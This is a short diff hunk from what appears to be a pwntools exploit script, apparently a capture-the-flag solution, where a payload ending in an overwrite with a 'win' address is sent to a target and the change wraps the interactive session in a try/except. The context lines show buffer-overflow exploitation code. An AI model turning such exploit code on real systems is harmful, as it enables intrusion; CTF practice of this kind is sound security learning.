@@ -32,4 +32,7 @@ payload += p64(win)
 r.sendline(payload)
 
 r.recvline()
-r.interactive()
+try:
+    r.interactive()
+except Exception:
+    pass
